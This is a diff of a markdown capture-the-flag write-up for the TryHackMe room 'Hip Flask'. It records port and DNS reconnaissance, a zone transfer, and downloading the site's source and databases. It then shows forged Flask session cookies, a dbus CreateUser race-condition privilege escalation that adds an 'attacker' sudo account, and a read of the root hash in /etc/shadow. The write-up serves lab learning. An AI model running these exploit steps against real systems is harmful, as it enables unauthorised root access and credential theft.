@@ -1,40 +1,18 @@
+<h1 align="center"><a href="https://tryhackme.com/room/hipflask">Hip Flask</a></h1>
+<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/b0cddcb5-5fac-455e-9268-bc8b9ffd6ed5"><br>
+If you find it helpful, consider coming back for research.<br><p align="center"><a href="https://github.com/RosanaFSS"><img src="https://img.shields.io/github/followers/RosanaFSS?label=Follow&style=for-the-badge&logo=github&color=24292e" alt="Follow Rosana on GitHub"></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="https://img.shields.io/badge/COMPLETED-2026%2C%20FEV%208-444444?style=for-the-badge&logo=calendar-check" alt="Completion Date"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="https://www.linkedin.com/in/rosanafssantos/"><img src="https://img.shields.io/badge/Connect-LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white" alt="Connect on LinkedIn"></a></p>
 
-```bash
-:~# git clone https://github.com/laramies/theHarvester.git
-```
 
-```bash
-uv sync
-```
-
-```bash
-:~/theHarvester# uv run theHarvester
-Created default proxies.yaml at /root/.theHarvester/proxies.yaml
-*******************************************************************
-*  _   _                                            _             *
-* | |_| |__   ___    /\  /\__ _ _ ____   _____  ___| |_ ___ _ __  *
-* | __|  _ \ / _ \  / /_/ / _` | '__\ \ / / _ \/ __| __/ _ \ '__| *
-* | |_| | | |  __/ / __  / (_| | |   \ V /  __/\__ \ ||  __/ |    *
-*  \__|_| |_|\___| \/ /_/ \__,_|_|    \_/ \___||___/\__\___|_|    *
-*                                                                 *
-* theHarvester 4.10.0                                             *
-* Coded by Christian Martorella                                   *
-* Edge-Security Research                                          *
-* cmartorella@edge-security.com                                   *
-*                                                                 *
-*******************************************************************
-usage: theHarvester [-h] -d DOMAIN [-l LIMIT] [-S START] [-p] [-s] [--screenshot SCREENSHOT] [-e DNS_SERVER] [-t]
-                    [-r [DNS_RESOLVE]] [-n] [-c] [-f FILENAME] [-w WORDLIST] [-a] [-q] [-b SOURCE]
-theHarvester: error: the following arguments are required: -d/--domain
-```
+<br>
+<br>
 
 
 ```bash
-:~/theHarvester# nmap 10.80.142.143
+:~/# nmap MACHINE_IP
 Starting Nmap 7.80 ( https://nmap.org ) at 2026-02-08 18:22 GMT
 mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
 mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
-Nmap scan report for 10.80.142.143
+Nmap scan report for MACHINE_IP
 Host is up (0.00046s latency).
 Not shown: 996 closed ports
 PORT    STATE SERVICE
@@ -47,21 +25,21 @@ Nmap done: 1 IP address (1 host up) scanned in 0.35 seconds
 ```
 
 ```bash
-:~/theHarvester# nmap -vv 10.80.142.143 -oN Initial-SYN-Scan
+:~/# nmap -vv MACHINE_IP -oN Initial-SYN-Scan
 Starting Nmap 7.80 ( https://nmap.org ) at 2026-02-08 18:22 GMT
 Initiating Ping Scan at 18:22
-Scanning 10.80.142.143 [4 ports]
+Scanning MACHINE_IP [4 ports]
 Completed Ping Scan at 18:22, 0.03s elapsed (1 total hosts)
 mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
 mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
 Initiating SYN Stealth Scan at 18:22
-Scanning 10.80.142.143 [1000 ports]
-Discovered open port 443/tcp on 10.80.142.143
-Discovered open port 80/tcp on 10.80.142.143
-Discovered open port 53/tcp on 10.80.142.143
-Discovered open port 22/tcp on 10.80.142.143
+Scanning MACHINE_IP [1000 ports]
+Discovered open port 443/tcp on MACHINE_IP
+Discovered open port 80/tcp on MACHINE_IP
+Discovered open port 53/tcp on MACHINE_IP
+Discovered open port 22/tcp on MACHINE_IP
 Completed SYN Stealth Scan at 18:22, 0.07s elapsed (1000 total ports)
-Nmap scan report for 10.80.142.143
+Nmap scan report for MACHINE_IP
 Host is up, received syn-ack ttl 64 (0.00064s latency).
 Scanned at 2026-02-08 18:22:59 GMT for 0s
 Not shown: 996 closed ports
@@ -77,32 +55,30 @@ Nmap done: 1 IP address (1 host up) scanned in 0.24 seconds
            Raw packets sent: 1004 (44.152KB) | Rcvd: 1001 (40.060KB)
 ```
            
-
-
 ```bash
-:~/theHarvester# nmap -p 22,53,80,443 -sV -Pn -vv 10.80.142.143 -oN service-scan
+:~/# nmap -p 22,53,80,443 -sV -Pn -vv MACHINE_IP -oN service-scan
 Starting Nmap 7.80 ( https://nmap.org ) at 2026-02-08 18:23 GMT
 NSE: Loaded 45 scripts for scanning.
 mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
 mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
 Initiating SYN Stealth Scan at 18:23
-Scanning 10.80.142.143 [4 ports]
-Discovered open port 443/tcp on 10.80.142.143
-Discovered open port 53/tcp on 10.80.142.143
-Discovered open port 22/tcp on 10.80.142.143
-Discovered open port 80/tcp on 10.80.142.143
+Scanning MACHINE_IP [4 ports]
+Discovered open port 443/tcp on MACHINE_IP
+Discovered open port 53/tcp on MACHINE_IP
+Discovered open port 22/tcp on MACHINE_IP
+Discovered open port 80/tcp on MACHINE_IP
 Completed SYN Stealth Scan at 18:23, 0.03s elapsed (4 total ports)
 Initiating Service scan at 18:23
-Scanning 4 services on 10.80.142.143
+Scanning 4 services on MACHINE_IP
 Completed Service scan at 18:23, 16.01s elapsed (4 services on 1 host)
-NSE: Script scanning 10.80.142.143.
+NSE: Script scanning MACHINE_IP.
 NSE: Starting runlevel 1 (of 2) scan.
 Initiating NSE at 18:23
 Completed NSE at 18:23, 0.07s elapsed
 NSE: Starting runlevel 2 (of 2) scan.
 Initiating NSE at 18:23
 Completed NSE at 18:23, 0.01s elapsed
-Nmap scan report for 10.80.142.143
+Nmap scan report for MACHINE_IP
 Host is up, received user-set (0.00039s latency).
 Scanned at 2026-02-08 18:23:21 GMT for 16s
 
@@ -125,22 +101,21 @@ Nmap done: 1 IP address (1 host up) scanned in 17.58 seconds
 
 ```
 
-
 ```bash
-:~/theHarvester# nmap -sU --top-ports 50 -Pn -vv --open  10.80.142.143 -oN udp-top-ports
+:~/# nmap -sU --top-ports 50 -Pn -vv --open  MACHINE_IP -oN udp-top-ports
 Starting Nmap 7.80 ( https://nmap.org ) at 2026-02-08 18:24 GMT
 mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
 mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
 Initiating UDP Scan at 18:24
-Scanning 10.80.142.143 [50 ports]
-Increasing send delay for 10.80.142.143 from 0 to 50 due to max_successful_tryno increase to 4
-Increasing send delay for 10.80.142.143 from 50 to 100 due to max_successful_tryno increase to 5
-Increasing send delay for 10.80.142.143 from 100 to 200 due to max_successful_tryno increase to 6
-Increasing send delay for 10.80.142.143 from 200 to 400 due to max_successful_tryno increase to 7
-Increasing send delay for 10.80.142.143 from 400 to 800 due to max_successful_tryno increase to 8
-Discovered open port 53/udp on 10.80.142.143
+Scanning MACHINE_IP [50 ports]
+Increasing send delay for MACHINE_IP from 0 to 50 due to max_successful_tryno increase to 4
+Increasing send delay for MACHINE_IP from 50 to 100 due to max_successful_tryno increase to 5
+Increasing send delay for MACHINE_IP from 100 to 200 due to max_successful_tryno increase to 6
+Increasing send delay for MACHINE_IP from 200 to 400 due to max_successful_tryno increase to 7
+Increasing send delay for MACHINE_IP from 400 to 800 due to max_successful_tryno increase to 8
+Discovered open port 53/udp on MACHINE_IP
 Completed UDP Scan at 18:25, 53.91s elapsed (50 total ports)
-Nmap scan report for 10.80.142.143
+Nmap scan report for MACHINE_IP
 Host is up, received user-set (0.00087s latency).
 Scanned at 2026-02-08 18:24:22 GMT for 54s
 Not shown: 46 closed ports
@@ -159,34 +134,34 @@ Nmap done: 1 IP address (1 host up) scanned in 54.03 seconds
 
 <img width="951" height="131" alt="image" src="https://github.com/user-attachments/assets/08ad5a93-89d9-4597-9c59-8e88cac8989e" />
 
-
+<br>
+<br>
+<br>
 
 ```bash
-:~/theHarvester# dig axfr hipflasks.thm @10.80.142.143
+:~/# dig axfr hipflasks.thm @MACHINE_IP
 
-; <<>> DiG 9.18.28-0ubuntu0.20.04.1-Ubuntu <<>> axfr hipflasks.thm @10.80.142.143
+; <<>> DiG 9.18.28-0ubuntu0.20.04.1-Ubuntu <<>> axfr hipflasks.thm @MACHINE_IP
 ;; global options: +cmd
 hipflasks.thm.		86400	IN	SOA	ns1.hipflasks.thm. localhost. 1 604800 86400 2419200 86400
 hipflasks.thm.		86400	IN	NS	ns1.hipflasks.thm.
 hipflasks.thm.		86400	IN	NS	localhost.
-hipper.hipflasks.thm.	86400	IN	A	10.80.142.143
-www.hipper.hipflasks.thm. 86400	IN	A	10.80.142.143
-ns1.hipflasks.thm.	86400	IN	A	10.80.142.143
+hipper.hipflasks.thm.	86400	IN	A	MACHINE_IP
+www.hipper.hipflasks.thm. 86400	IN	A	MACHINE_IP
+ns1.hipflasks.thm.	86400	IN	A	MACHINE_IP
 hipflasks.thm.		86400	IN	SOA	ns1.hipflasks.thm. localhost. 1 604800 86400 2419200 86400
 ;; Query time: 0 msec
-;; SERVER: 10.80.142.143#53(10.80.142.143) (TCP)
+;; SERVER: MACHINE_IP#53(MACHINE_IP) (TCP)
 ;; WHEN: Sun Feb 08 18:36:53 GMT 2026
 ;; XFR size: 7 records (messages 1, bytes 242)
 ```
 
-
-
 ```bash
-:~/theHarvester# host -t axfr hipflasks.thm 10.80.142.143
+:~/# host -t axfr hipflasks.thm MACHINE_IP
 Trying "hipflasks.thm"
 Using domain server:
-Name: 10.80.142.143
-Address: 10.80.142.143#53
+Name: MACHINE_IP
+Address: MACHINE_IP#53
 Aliases: 
 
 ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 49499
@@ -199,36 +174,48 @@ Aliases:
 hipflasks.thm.		86400	IN	SOA	ns1.hipflasks.thm. localhost. 1 604800 86400 2419200 86400
 hipflasks.thm.		86400	IN	NS	ns1.hipflasks.thm.
 hipflasks.thm.		86400	IN	NS	localhost.
-hipper.hipflasks.thm.	86400	IN	A	10.80.142.143
-www.hipper.hipflasks.thm. 86400	IN	A	10.80.142.143
-ns1.hipflasks.thm.	86400	IN	A	10.80.142.143
+hipper.hipflasks.thm.	86400	IN	A	MACHINE_IP
+www.hipper.hipflasks.thm. 86400	IN	A	MACHINE_IP
+ns1.hipflasks.thm.	86400	IN	A	MACHINE_IP
 hipflasks.thm.		86400	IN	SOA	ns1.hipflasks.thm. localhost. 1 604800 86400 2419200 86400
 
-Received 203 bytes from 10.80.142.143#53 in 0 ms
+Received 203 bytes from MACHINE_IP#53 in 0 ms
 ```
-
 
 ```bash
 hipper
 ```
 
 
-
 <img width="958" height="768" alt="image" src="https://github.com/user-attachments/assets/532242af-19fd-4cdc-b93b-12e10516bd85" />
+
+<br>
+<br>
+<br>
 
 <img width="1101" height="803" alt="image" src="https://github.com/user-attachments/assets/b2ec99cd-3284-4398-8bff-555e137463b2" />
 
+<br>
+<br>
+<br>
 
 <img width="1075" height="256" alt="image" src="https://github.com/user-attachments/assets/1b7b8af2-e51d-4377-8402-173b841daf21" />
 
+<br>
+<br>
+<br>
+
 <img width="1095" height="698" alt="image" src="https://github.com/user-attachments/assets/130abbe6-259d-441a-a659-799f132dce8a" />
 
+<br>
+<br>
+<br>
 
 ```bash
-:~/theHarvester# nikto -h https://hipper.hipflasks.thm -ssl
+:~/# nikto -h https://hipper.hipflasks.thm -ssl
 - Nikto v2.1.5
 ---------------------------------------------------------------------------
-+ Target IP:          10.80.142.143
++ Target IP:          MACHINE_IP
 + Target Hostname:    hipper.hipflasks.thm
 + Target Port:        443
 ---------------------------------------------------------------------------
@@ -250,7 +237,6 @@ hipper
 + Allowed HTTP Methods: GET, OPTIONS, HEAD 
 ...
 ```
-
 
 ```bash
 :~# curl https://hipper.hipflasks.thm/main.py -k
@@ -292,7 +278,6 @@ AuthConn()
 
 serve(app, host="127.0.0.1", port=8000)
 ```
-
 
 
 ```bash
@@ -339,10 +324,6 @@ from libs.db.auth import AuthConn
 from libs.db.stats import StatsConn
 ```
 
-
-
-
-
 ```bash
 :~/lesson# curl -k https://hipper.hipflasks.thm/data/users.db -o users.db
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
@@ -358,14 +339,12 @@ drwxr-xr-x 53 root root 4.0K Feb  8 19:13 ..
 -rw-r--r--  1 root root  12K Feb  8 19:13 users.db
 ```
 
-
 ```bash
 :~/lesson# curl -k https://hipper.hipflasks.thm/data/stats.db -o stats.db
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
 100 12288  100 12288    0     0   631k      0 --:--:-- --:--:-- --:--:--  631k
 ```
-
 
 ```bash
 :~/lesson# ls -lah
@@ -387,20 +366,16 @@ drwxr-xr-x 53 root root 4.0K Feb  8 19:13 ..
 -rw-r--r--  1 root root  862 Feb  8 19:18 main.py
 -rw-r--r--  1 root root  12K Feb  8 19:14 stats.db
 -rw-r--r--  1 root root  12K Feb  8 19:13 users.db
-
 ```
-
 
 ```bash
 :~/lesson# python3 -m venv poc-venv
 ```
 
-
 ```bash
 :~/lesson# source poc-venv/bin/activate
 (poc-venv) r...:~/lesson# 
 ```
-
 
 ```bash
 (poc-venv) r...:~/lesson# pip3 install flask requests waitress
@@ -410,10 +385,13 @@ drwxr-xr-x 53 root root 4.0K Feb  8 19:13 ..
 
 <br>
 <br>
+<br>
 
 <img width="1082" height="513" alt="image" src="https://github.com/user-attachments/assets/d24437e7-a153-4638-a2a2-bd04c88cfa1d" />
 
-
+<br>
+<br>
+<br>
 
 ```bash
 #!/usr/bin/env python3
@@ -438,16 +416,16 @@ time.sleep(1)
 print(requests.get("http://localhost:9000/").cookies.get("session"))
 ```
 
-
 ```bash
 (poc-venv) ...:~/lesson/poc-venv# ./bin/python3 a.py
 eyJhdXRoIjoiVHJ1ZSIsInVzZXJuYW1lIjoiUGVudGVzdGVyIn0.aYjo7Q.hOtEDEOxh2VGxQ-tO2lkiEibi3A
 ```
 
-
 <img width="1087" height="541" alt="image" src="https://github.com/user-attachments/assets/84dd8e51-23c7-4b60-88e4-bbc51264ceb7" />
 
-
+<br>
+<br>
+<br>
 
 ```bash
 #!/usr/bin/env python3
@@ -470,9 +448,7 @@ thread.start()
 
 time.sleep(1)
 print(requests.get("http://localhost:9000/").cookies.get("session"))
-
 ```
-
 
 ```bash
 :~/lesson/poc-venv# ./bin/python3 a.py
@@ -506,23 +482,18 @@ thread.start()
 
 time.sleep(1)
 print(requests.get("http://localhost:9000/").cookies.get("session"))
-
 ```
-
 
 ```bash
 :~/lesson/poc-venv# ./bin/python3 a.py
 .eJwdyEEKgCAQAMC_7EWF8AG9o1uEbLaZYCqunsS_J92G6YCtPrDCVhrBAo2pRHxpTu82xds7bYwNyGzMlI--_nAhnRhm7iKxOHROmaIUgYXShfCSagwYH0KTIT4.aYjqlg.9h0c2WvII4utL3FCdmWG1tanMXc
 ```
 
-
 <img width="1094" height="604" alt="image" src="https://github.com/user-attachments/assets/863990e3-0fb5-4aef-8f64-55afed131353" />
 
-
 <br>
 <br>
 <br>
-
 
 ```bash
 #!/usr/bin/env python3
@@ -545,9 +516,7 @@ thread.start()
 
 time.sleep(1)
 print(requests.get("http://localhost:9000/").cookies.get("session"))
-
 ```
-
 
 ```bash
 ~/lesson/poc-venv# ./bin/python3 a.py
@@ -559,7 +528,6 @@ print(requests.get("http://localhost:9000/").cookies.get("session"))
 <br>
 <br>
 <br>
-
 
 ```bash
 Admin Console Welcome, uid=33(www-data) gid=33(www-data) groups=33(www-data) www-data /usr/bin/nc /usr/bin/bash /usr/bin/curl /usr/bin/wget /bin/sh: 1: sestatus: not found You do not have enough privilege to read the profile set. apparmor module is loaded. DISTRIB_ID=Ubuntu DISTRIB_RELEASE=20.04 DISTRIB_CODENAME=focal DISTRIB_DESCRIPTION="Ubuntu 20.04.2 LTS" NAME="Ubuntu" VERSION="20.04.2 LTS (Focal Fossa)" ID=ubuntu ID_LIKE=debian PRETTY_NAME="Ubuntu 20.04.2 LTS" VERSION_ID="20.04" HOME_URL="https://www.ubuntu.com/" SUPPORT_URL="https://help.ubuntu.com/" BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/" PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy" VERSION_CODENAME=focal UBUNTU_CODENAME=focal # Generated by iptables-save v1.8.4 on Tue Jun 22 22:27:55 2021 *filter :INPUT ACCEPT [174:25634] :FORWARD ACCEPT [0:0] :OUTPUT DROP [0:0] -A INPUT -p icmp -j DROP -A OUTPUT -m state --state RELATED,ESTABLISHED -j ACCEPT -A OUTPUT -o lo -j ACCEPT -A OUTPUT -p tcp -m multiport --dports 443,445,80,25,53 -j ACCEPT -A OUTPUT -p udp -m udp --dport 53 -j ACCEPT -A OUTPUT -p icmp -j ACCEPT COMMIT # Completed on Tue Jun 22 22:27:55 2021 # Generated by ip6tables-save v1.8.4 on Tue Jun 22 22:27:55 2021 *filter :INPUT ACCEPT [0:0] :FORWARD ACCEPT [0:0] :OUTPUT ACCEPT [0:0] COMMIT # Completed on Tue Jun 22 22:27:55 2021
@@ -589,12 +557,10 @@ DISTRIB_CODENAME=focal DISTRIB_DESCRIPTION="Ubuntu 20.04.2 LTS" NAME="Ubuntu" VE
 There have been 7459 unique visitors to the site!
 ```
 
-
 ```bash
 :~/lesson/poc-venv# ./bin/python3 a.py
 .eJxNzE8LgjAcxvG38mOHphD7YzuEhu8h8FIRY9rUkdtk05P53pMuefvy4eFZkJqnHuWoCrNGRzRHHZyyepNlabxrTUekbAYVo5RbGWemX3SDr9Ww4QP7iJ9k9KN2Cbbv1rQe6GRHeq-u7FaAa4AzcmaEZ4JwwUGIE7DLfwIfoLVxNPZQ7jQrD7yAYHdnOCVBq1eSritav6RYOrc.aYjsWw.cIp05caJD5DZEYBpSvBvUG9FJAE
 ```
-
 
 <img width="941" height="347" alt="image" src="https://github.com/user-attachments/assets/4d823647-f0c0-44fe-bbe4-cc2d6da84f8b" />
 
@@ -603,7 +569,6 @@ There have been 7459 unique visitors to the site!
 <br>
 
 <img width="938" height="538" alt="image" src="https://github.com/user-attachments/assets/fe181d4c-1798-48ee-9c66-4154a85a0abd" />
-
 
 
 ```bash
@@ -620,7 +585,6 @@ real	0m0.011s
 user	0m0.001s
 sys	0m0.000s
 ```
-
 
 ```bash
 www-data@websrv1:/opt/site$ dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1 & sleep 0.005s; kill $!
@@ -648,13 +612,11 @@ See "man sudo_root" for details.
 attacker@websrv1:/opt/site$ 
 ```
 
-
 <img width="943" height="438" alt="image" src="https://github.com/user-attachments/assets/ad8379b9-6fd6-4561-9aff-4b3d319229ca" />
 
 <br>
 <br>
 <br>
-
 
 ```bash
 attacker@websrv1:/opt/site$ sudo -s
@@ -682,7 +644,7 @@ root@websrv1:/opt/site# ip a
        valid_lft forever preferred_lft forever
 2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
     link/ether 0a:3c:4d:cd:9f:41 brd ff:ff:ff:ff:ff:ff
-    inet 10.80.142.143/18 brd 10.80.191.255 scope global dynamic eth0
+    inet MACHINE_IP/18 brd 10.80.191.255 scope global dynamic eth0
        valid_lft 1060sec preferred_lft 1060sec
     inet6 fe80::83c:4dff:fecd:9f41/64 scope link 
        valid_lft forever preferred_lft forever
@@ -700,14 +662,16 @@ root@websrv1:~# cat /etc/shadow | grep root
 root:$6$./Fh3mWMsk8X29kq$6CvaDzV7zlXKn1MMQjXtO.abB4/7ecNKBFkQvEWsLkgM8raAZeuSHZurnXG01pqZ4BY2ubk/WgIbo4ee.wnaP0:18791:0:99999:7:::
 ```
 
-
 <img width="943" height="129" alt="image" src="https://github.com/user-attachments/assets/666a2851-8397-4f25-9a08-fa76c9c99335" />
 
 <br>
 <br>
 <br>
 
+<h1>Completed</h1>
 
+
+<img width="1890" height="895" alt="image" src="https://github.com/user-attachments/assets/f6ce9325-b512-46b9-a9ef-fe0e746f5414" />
 
 
 
